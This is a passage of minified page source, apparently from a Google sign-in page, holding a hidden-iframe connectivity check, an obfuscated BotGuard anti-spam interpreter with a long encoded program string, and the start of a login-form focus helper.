G.p=function(a,b){if(!Gn(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.d(a),this.a=!0):this.i(b)==this.b&&(this.j(b)||this.d(a),this.a=!0);return!0};G.m=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.o=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.m();a.id=this.b;Gq.appendChild(a)};
var Gu=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].p(c,b);e++);}},Gv=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gq=document.getElementById(a))?(b&&(Gr=document.getElementById(b)),c&&(Gs=document.getElementById(c)),Gr||Gs?a=!0:(Go.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Go.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Go.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gt(a[d].iframeUri,a[d].domainSymbol));
Gd(window,"message",Gu(c));for(d=0;d<b;d++)c[d].o()}}}},Gw=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Go.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Go.f(Gv);G_setPostMessageSupportFlag=Go.f(Gw);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: '#',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29tCg== */(function(){eval('var f,g=this,k=void 0,p=Date.now||function(){return+new Date},q=function(a,b,c,d,e){c=a.split("."),d=g,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||b===k?d=d[e]?d[e]:d[e]={}:d[e]=b},s=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},t=(new function(){p()},function(a,b){a.m=("E:"+b.message+":"+b.stack).slice(0,2048)}),v=function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b},w=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},z=function(a,b){a.K.push(a.c.slice()),a.c[a.b]=k,x(a,a.b,b)},A=function(a,b,c){return c=function(){return a},b=function(){return c()},b.V=function(b){a=b},b},C=function(a,b,c,d){return function(){if(!d||a.q)return x(a,a.P,arguments),x(a,a.k,c),B(a,b)}},D=function(a,b,c,d){for(c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},B=function(a,b,c,d){return c=a.a(a.b),a.e&&c<a.e.length?(x(a,a.b,a.e.length),z(a,b)):x(a,a.b,b),d=a.s(),x(a,a.b,c),d},F=function(a,b,c,d){for(b={},b.N=a.a(E(a)),b.O=E(a),c=E(a)-1,d=E(a),b.self=a.a(d),b.C=[];c--;)d=E(a),b.C.push(a.a(d));return b},G=function(a,b){return b<=a.ca?b==a.h||b==a.d||b==a.f||b==a.o?a.n:b==a.P||b==a.H||b==a.I||b==a.k?a.v:b==a.w?a.i:4:[1,2,4,a.n,a.v,a.i][b%a.da]},H=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},x=function(a,b,c){if(b==a.b||b==a.l)a.c[b]?a.c[b].V(c):a.c[b]=A(c);else if(b!=a.d&&b!=a.f&&b!=a.h||!a.c[b])a.c[b]=I(c,a.a);b==a.p&&(a.t=k,x(a,a.b,a.a(a.b)+4))},J=function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b},E=function(a,b,c){if(b=a.a(a.b),!(b in a.e))throw a.g(a.Y),a.u;return a.t==k&&(a.t=w(a.e,b-4),a.B=k),a.B!=b>>3&&(a.B=b>>3,c=[0,0,0,a.a(a.p)],a.Z=H(a.t,a.B,c)),x(a,a.b,b+1),a.e[b]^a.Z[b%8]},I=function(a,b,c,d,e,h,l,n,m){return n=K,e=K.prototype,h=e.s,l=e.Q,m=e.g,d=function(){return c()},c=function(a,r,u){for(u=0,a=d[e.D],r=a===b,a=a&&a[e.D];a&&a!=h&&a!=l&&a!=n&&a!=m&&20>u;)u++,a=a[e.D];return c[e.ga+r+!(!a+(u>>2))]},d[e.J]=e,c[e.fa]=a,a=k,d},L=function(a,b,c,d,e,h){for(e=a.a(b),b=b==a.f?function(b,c,d,h){try{c=e.length,d=c-4>>3,e.ba!=d&&(e.ba=d,d=(d<<3)-4,h=[0,0,0,a.a(a.G)],e.aa=H(w(e,d),w(e,d+4),h)),e.push(e.aa[c&7]^b)}catch(r){throw r;}}:function(a){e.push(a)},d&&b(d&255),h=0,d=c.length;h<d;h++)b(c[h])},K=function(a,b,c,d,e,h){try{if(this.j=2048,this.c=[],x(this,this.b,0),x(this,this.l,0),x(this,this.p,0),x(this,this.h,[]),x(this,this.d,[]),x(this,this.H,"object"==typeof window?window:g),x(this,this.I,this),x(this,this.r,0),x(this,this.F,0),x(this,this.G,0),x(this,this.f,v(4)),x(this,this.o,[]),x(this,this.k,{}),this.q=true,a&&"!"==a[0])this.m=a;else{if(window.atob){for(c=window.atob(a),a=[],e=d=0;e<c.length;e++){for(h=c.charCodeAt(e);255<h;)a[d++]=h&255,h>>=8;a[d++]=h}b=a}else b=null;(this.e=b)&&this.e.length?(this.K=[],this.s()):this.g(this.U)}}catch(l){t(this,l)}};f=K.prototype,f.b=0,f.p=1,f.h=2,f.l=3,f.d=4,f.w=5,f.P=6,f.L=8,f.H=9,f.I=10,f.r=11,f.F=12,f.G=13,f.f=14,f.o=15,f.k=16,f.ca=17,f.R=15,f.$=12,f.S=10,f.T=42,f.da=6,f.i=-1,f.n=-2,f.v=-3,f.U=17,f.W=21,f.A=22,f.ea=30,f.Y=31,f.X=33,f.u={},f.D="caller",f.J="toString",f.ga=34,f.fa=36,K.prototype.a=function(a,b){if(b=this.c[a],b===k)throw this.g(this.ea,0,a),this.u;return b()},K.prototype.ka=function(a,b,c,d){d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},K.prototype.ja=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},K.prototype.la=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},K.prototype.g=function(a,b,c,d){d=this.a(this.l),a=[a,d>>8&255,d&255],c!=k&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=k,x(this,this.h,a)),c="",b&&(b.message&&(c+=b.message),b.stack&&(c+=":"+b.stack)),3<this.j&&(c=c.slice(0,this.j-3),this.j-=c.length+3,c=J(c),L(this,this.f,D(c.length,2).concat(c),this.$))},f.M=[function(){},function(a,b,c,d,e){b=E(a),c=E(a),d=a.a(b),b=G(a,b),e=G(a,c),e==a.i||e==a.n?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),x(a,c,d)},function(a,b,c,d,e,h,l,n,m){if(b=E(a),c=G(a,b),0<c){for(d=0;c--;)d=d<<8|E(a);x(a,b,d)}else if(c!=a.v){if(d=E(a)<<8|E(a),c==a.i)if(c="",a.c[a.w]!=k)for(e=a.a(a.w);d--;)h=e[E(a)<<8|E(a)],c+=h;else{for(c=Array(d),e=0;e<d;e++)c[e]=E(a);for(d=c,c=[],h=e=0;e<d.length;)l=d[e++],128>l?c[h++]=String.fromCharCode(l):191<l&&224>l?(n=d[e++],c[h++]=String.fromCharCode((l&31)<<6|n&63)):(n=d[e++],m=d[e++],c[h++]=String.fromCharCode((l&15)<<12|(n&63)<<6|m&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=E(a);x(a,b,c)}},function(a){E(a)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),c=a.a(c),b=a.a(b),x(a,d,b[c])},function(a,b,c){b=E(a),c=E(a),b=a.a(b),x(a,c,s(b))},function(a,b,c,d,e){b=E(a),c=E(a),d=G(a,b),e=G(a,c),c!=a.h&&(d==a.i&&e==a.i?(a.c[c]==k&&x(a,c,""),x(a,c,a.a(c)+a.a(b))):e==a.n&&(0>d?(b=a.a(b),d==a.i&&(b=J(""+b)),c!=a.d&&c!=a.f&&c!=a.o||L(a,c,D(b.length,2)),L(a,c,b)):0<d&&L(a,c,D(a.a(b),d))))},function(a,b,c){b=E(a),c=E(a),x(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)-a.a(b))},function(a,b){b=F(a),x(a,b.O,b.N.apply(b.self,b.C))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=E(a),c=a.a(E(a)),d=a.a(E(a)),e=a.a(E(a)),a.a(b).addEventListener(c,C(a,d,e,true),false)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)[a.a(c)]=a.a(d)},function(){},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)+a.a(b))},function(a,b,c){b=E(a),c=E(a),0!=a.a(b)&&x(a,a.b,a.a(c))},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)==a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)>a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)<<c)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)|a.a(c))},function(a,b){b=a.a(E(a)),z(a,b)},function(a,b,c,d){if(b=a.K.pop()){for(c=E(a);0<c;c--)d=E(a),b[d]=a.c[d];a.c=b}else x(a,a.b,a.e.length)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=E(a),c=a.a(E(a)),d=a.a(E(a)),x(a,b,C(a,c,d))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)>>c)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)||a.a(c))},function(a,b,c,d,e){b=F(a),c=b.C,d=b.self,e=b.N;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.g(a.A);return}x(a,b.O,c)},function(a,b,c,d,e,h){if(b=E(a),c=E(a),d=E(a),e=E(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==s(b)){for(h in e=[],b)e.push(h);b=e}for(e=0,h=b.length;e<h;e+=d)c(b.slice(e,e+d),a)}],K.prototype.ia=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),K.prototype.ha=function(a,b){return b=this.Q(),a&&a(b),b},K.prototype.s=function(a,b,c,d,e,h){try{for(b=2001,c=k,d=0,a=this.e.length;--b&&(d=this.a(this.b))<a;)try{x(this,this.l,d),e=E(this)%this.M.length,(c=this.M[e])?c(this):this.g(this.W,0,e)}catch(l){l!=this.u&&((h=this.a(this.r))?(x(this,h,l),x(this,this.r,0)):this.g(this.A,l))}b||this.g(this.X)}catch(n){try{this.g(this.A,n)}catch(m){t(this,m)}}return this.a(this.k)},K.prototype.Q=function(a,b,c,d,e,h,l,n,m,y,r){if(this.m)return this.m;try{if(this.q=false,b=this.a(this.d).length,c=this.a(this.f).length,d=this.j,this.c[this.L]&&B(this,this.a(this.L)),e=this.a(this.h),0<e.length&&L(this,this.d,D(e.length,2).concat(e),this.R),h=this.a(this.F)&255,h-=this.a(this.d).length+4,l=this.a(this.f),4<l.length&&(h-=l.length+3),0<h&&L(this,this.d,D(h,2).concat(v(h)),this.S),4<l.length&&L(this,this.d,D(l.length,2).concat(l),this.T),n=[3].concat(this.a(this.d)),window.btoa?(y=window.btoa(String.fromCharCode.apply(null,n)),m=y=y.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")):m=k,m)m="!"+m;else for(m="",e=0;e<n.length;e++)r=n[e][this.J](16),1==r.length&&(r="0"+r),m+=r;a=m,this.j=d,this.q=true,this.a(this.d).length=b,this.a(this.f).length=c}catch(u){t(this,u),a=this.m}return a};try{window.addEventListener("unload",function(){},false)}catch(M){}q("botguard.bg",K),q("botguard.bg.prototype.invoke",K.prototype.ha);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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');
  </script>
<script>
  (function() {
  function gaia_setFocus() {
  var form = null;
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form && form.Passwd) {
  form.Passwd.focus();
  }
